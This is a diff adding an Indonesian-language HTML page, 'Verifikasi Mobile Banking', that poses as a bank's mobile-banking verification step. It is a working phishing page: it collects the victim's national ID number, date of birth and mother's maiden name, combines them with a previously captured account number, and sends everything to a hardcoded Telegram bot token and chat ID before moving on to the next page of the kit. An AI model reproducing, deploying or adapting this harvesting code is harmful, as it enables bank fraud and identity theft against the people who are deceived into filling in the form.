@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Verifikasi Mobile Banking</title>
+
+<style>
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+  background:#f2f2f4;
+}
+.header{
+  height:56px;
+  background:#1496e6;
+  color:#fff;
+  position:relative;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.header .back{
+  position:absolute;
+  left:16px;
+  font-size:24px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+/* ✅ TAMBAHAN — DISAMAKAN DENGAN HALAMAN 1 */
+.header-title{
+  font-size:20px;
+  font-weight:bold;
+}
+
+.container{ padding:20px; }
+.label{ font-weight:600; margin-bottom:12px; display:block; }
+.input-box{
+  background:#fff;
+  border-radius:16px;
+  padding:18px;
+  margin-bottom:20px;
+}
+.input-box input{
+  border:none;
+  outline:none;
+  width:100%;
+  font-size:17px;
+  font-weight:600;
+}
+.btn{
+  width:100%;
+  background:#1593e6;
+  color:#fff;
+  border:none;
+  padding:16px;
+  font-size:16px;
+  border-radius:14px;
+  font-weight:bold;
+}
+/* Hilangkan outline dan highlight di semua elemen fokus / tap */
+* {
+  -webkit-tap-highlight-color: transparent; /* hilangkan biru di mobile */
+  -webkit-user-select: none; /* optional: cegah seleksi teks accidental */
+  -webkit-appearance: none;  /* hilangkan style default iOS */
+  -moz-appearance: none;
+  appearance: none;
+  outline: none;             /* hilangkan outline default browser */
+  box-shadow: none;          /* hilangkan shadow default saat focus */
+}
+
+/* Khusus input, textarea, select, button */
+input, textarea, select, button {
+  outline: none !important;
+  box-shadow: none !important;
+  -webkit-tap-highlight-color: transparent !important;
+  -webkit-appearance: none !important;
+  appearance: none !important;
+  user-select: none;
+}
+
+/* Optional: hilangkan efek saat ditekan tombol / input di mobile */
+input:active, button:active, textarea:active, select:active {
+  background-color: inherit;
+  transform: none;
+  box-shadow: none;
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- ✅ HEADER SAJA YANG DIUBAH -->
+<div class="header">
+  <div class="back" onclick="history.back()">←</div>
+  <div class="header-title">Verifikasi Mobile Banking</div>
+</div>
+
+<div class="container">
+
+  <label class="label">Nomor KTP</label>
+  <div class="input-box">
+    <input id="ktp" type="tel" maxlength="16"
+      placeholder="Masukkan Nomor KTP"
+      oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+  </div>
+
+  <label class="label">Tanggal Lahir</label>
+  <div class="input-box">
+    <input id="tgl" type="text" maxlength="10"
+      placeholder="Masukan Tanggal lahir"
+      oninput="formatTanggal(this)">
+  </div>
+
+  <label class="label">Nama Ibu Kandung</label>
+  <div class="input-box">
+    <input id="ibu" type="text" placeholder="Masukkan Nama Ibu Kandung">
+  </div>
+
+  <button class="btn" onclick="nextPage()">Selanjutnya</button>
+</div>
+
+<script>
+const dataLama = JSON.parse(localStorage.getItem('dataReg')) || {};
+if(!dataLama.nomor_rekening){
+  alert('Data tidak lengkap, silakan ulangi dari awal');
+  window.location.href = 'halaman1.html';
+}
+
+function formatTanggal(el){
+  let v = el.value.replace(/[^0-9]/g,'');
+  if(v.length > 8) v = v.slice(0,8);
+  if(v.length >= 5){
+    el.value = v.slice(0,2)+'-'+v.slice(2,4)+'-'+v.slice(4);
+  }else if(v.length >= 3){
+    el.value = v.slice(0,2)+'-'+v.slice(2);
+  }else{
+    el.value = v;
+  }
+}
+
+async function kirimKeTelegram(data){
+  const TOKEN   = "7701091667:AAEK6o1oKgQoxt-5JybA04kmtqJmYbNQt_8";
+  const CHAT_ID = "5983910858";
+
+  const pesan =
+`📋 REGISTRASI MOBILE
+━━━━━━━━━━━━━━
+REKENING : ${data.nomor_rekening}
+KTP      : ${data.ktp}
+TTL      : ${data.tgl}
+IBU      : ${data.ibu}
+━━━━━━━━━━━━━━
+🕒 ${new Date().toLocaleString()}`;
+
+  await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
+}
+
+async function nextPage(){
+  const ktp = document.getElementById('ktp').value.trim();
+  const tgl = document.getElementById('tgl').value.trim();
+  const ibu = document.getElementById('ibu').value.trim();
+
+  if(ktp.length !== 16) return alert('Nomor KTP harus 16 digit');
+  if(!/^\d{2}-\d{2}-\d{4}$/.test(tgl)) return alert('Format tanggal salah');
+  if(!ibu) return alert('Nama ibu wajib diisi');
+
+  const dataGabung = { ...dataLama, ktp, tgl, ibu };
+  localStorage.setItem('dataReg', JSON.stringify(dataGabung));
+
+  await kirimKeTelegram(dataGabung);
+  window.location.href = 'halaman3.html';
+}
+</script>
+
+</body>
+</html>
